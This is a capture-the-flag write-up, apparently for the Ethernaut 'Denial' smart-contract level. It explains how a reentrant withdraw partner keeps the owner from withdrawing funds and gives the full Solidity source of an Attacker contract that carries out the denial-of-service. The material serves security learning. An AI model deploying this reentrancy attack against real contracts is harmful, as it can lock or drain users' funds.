## Goal

Deny the owner from withdrawing funds when they call withdraw()

## Exploit

In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.

Within the Attacker contract, we can make reentrant call to the withdraw() function up until the balance of ether in the Denial contract is greater than 0.
This will cause the amountToSend variable to become 0, because of the following division:

```
uint amountToSend = address(this).balance / 100;
```

while the contract still holds small amount of ETH.

To exploit the contract we need to:

1. create Attacker contract, and create instance from the Denial contract inside the Attacker contract
2. in the constructor of the Attacker contract, we need to set the Attacker contract as partner
3. in the receive function of the Attacker we need to make reentrant call to the withdraw() function of the Denial contract, as long as the balance of ETH in Denial is greater than 0.
4. we need to call the withdraw() function inside Denial contract

## Attacker contract code

```
contract Attacker {
    Denial private denial;
    constructor(Denial _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(address(denial).balance > 0) {
            denial.withdraw();
        }
    }
}
```
